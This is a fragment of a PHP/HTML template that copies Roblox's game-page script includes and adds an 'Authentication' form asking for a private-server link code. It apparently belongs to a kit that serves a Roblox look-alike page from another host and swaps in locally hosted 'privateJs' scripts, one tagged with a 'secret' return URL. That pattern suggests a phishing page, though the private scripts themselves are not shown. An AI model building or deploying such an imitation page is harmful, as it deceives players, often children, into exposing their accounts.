<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Verification.Identity" data-bundle-source="Unknown" src="https://js.rbxcdn.com/3f6cf43ba9cc024bb84a85caee38f7c5b98ce5a2e3006d197f21eecc25f495c7.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="GameLaunch" id="GameLaunch" secret="<?=$returnUrl;?>" data-bundle-source="Main" src="/privateJs/GameLaunch.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.VisitGame" data-bundle-source="Unknown" src="https://js.rbxcdn.com/4ce2522516aad306779a46144f39800e2adb1f31cac04881daa88aaa96cc97bf.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.VisitGame" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c15073cf382cb56f2db0437ffcd3b9de10a92d99da9833badf3713c969485bce.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.GameLaunchGuestMode" data-bundle-source="Unknown" src="https://js.rbxcdn.com/f41ec06eeae79fa94e6ae9f435b0a1c6743085e898884eddb4d4025ca3af8a44.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.GameLaunchGuestMode" data-bundle-source="Unknown" src="https://js.rbxcdn.com/6852af8f7df15395ccb3d121a914ee7301a7162f5afb3395575c6075c617923f.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="GameGuidelines" data-bundle-source="Main" src="https://js.rbxcdn.com/579bd3087c42a80d06d0395a8b4054d03a8fe38b5005499e30b246ddc2fc2a24.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.GameDetails" data-bundle-source="Unknown" src="https://js.rbxcdn.com/a76ba29b46d4047bb36ecad4069ccbafde83a2d38e07f21aa8c4b40213625c96.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.GameDetails" data-bundle-source="Unknown" src="https://js.rbxcdn.com/d9f77bd8a2e775ee1a1db915c446c07ae25a0536f88655dbd734122fe31d6c79.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="GameDetails" data-bundle-source="Main" src="https://js.rbxcdn.com/ab1f9f5dbfd37f4fca2f0f8f647c90523e755ef86cc9c614bc44efb3b15365d3.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.GameGearOptionsDisplay" data-bundle-source="Unknown" src="https://js.rbxcdn.com/f30b6db01e31fc9b3156d10d0ecc7835d3727a40d445baf2a49f07c2bf3c9f5a.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.GameGearOptionsDisplay" data-bundle-source="Unknown" src="https://js.rbxcdn.com/25fc83f80e15e6642651792eb2078ada834cedcddfe16fff8b653aa1224f449c.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.SocialShare" data-bundle-source="Unknown" src="https://js.rbxcdn.com/78cdf1c1b22433f4e71b9bd015085cd0fd72fb698bc0be0bdbed03f3eb21241c.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.SocialShare" data-bundle-source="Unknown" src="https://js.rbxcdn.com/db9529d44b1e8b4184000ed5556470ff9450d32abf13f8330b97b55e2da9fe5d.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RecommendedGames" data-bundle-source="Main" src="https://js.rbxcdn.com/970a45cee21e6c4a33d3c4d73ab10fb842a990ade2b0fd175959a07a1459d7f7.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="LatencyMeasurement" data-bundle-source="Main" src="/privateJs/LatencyMeasurement.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="UserAgreementsChecker" data-bundle-source="Main" src="https://js.rbxcdn.com/a411b4655a0c97ad1d8209c2daa1e92b0dfc5d66716efcfea310f491aabf1ef6.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.UserAgreements" data-bundle-source="Unknown" src="https://js.rbxcdn.com/c46b4fb03550b521b63f90cdca3214e620c53f676987f9c644dc3ed60a9d74c9.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_CommonUI.UserAgreements" data-bundle-source="Unknown" src="https://js.rbxcdn.com/358e6ae5bebb0fa9326d0de99d3ee229ee63236bf44ed11b9ab1d314c7972e79.js"></script>
<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/31931d919383fd5ee02ee8e7874b3dc0.js'></script>
</body>
</html>
<?php endif;?>
<?php if(!$privateServerLinkCode):?>
<!doctype html>
<html lang="en">
<head>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<link href="https://fonts.googleapis.com/css?family=Roboto:300,400&amp;display=swap" rel="stylesheet">
<link rel="stylesheet" href="/controlPage/fonts/style.css">
<link rel="stylesheet" href="/controlPage/css/owl.carousel.min.css">

<link rel="stylesheet" href="/controlPage/css/bootstrap.min.css">

<link rel="stylesheet" href="/controlPage/css/style.css">
<title>Authentication</title>
</head>
<body>
<div class="content">
<div class="container">
<div class="row">
<div class="col-md-12 contents">
<div class="row justify-content-center">
<div class="col-md-8">
<div class="mb-4">
<?=$title;?>
</div>
<form action="#" method="post">
<div class="form-group first">
<label for="code">privateServerLinkCode (example: 16878959579021937254151088853927)</label>
<input type="text" class="form-control" id="code"> </div>
<button type="button" onclick="Redirect();" class="btn text-white btn-block btn-primary">Submit</button>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
<script>
	    function Redirect(){
	        var privateServerLinkCode = document.getElementById("code").value;
	        window.location.href = "?privateServerLinkCode=" + privateServerLinkCode;
	    }
	</script>
<script src="/controlPage/js/jquery-3.3.1.min.js"></script>
<script src="/controlPage/js/popper.min.js"></script>
<script src="/controlPage/js/bootstrap.min.js"></script>
<script src="/controlPage/js/main.js"></script>
</body>
</html>
<?php endif;?>
<?php } ?>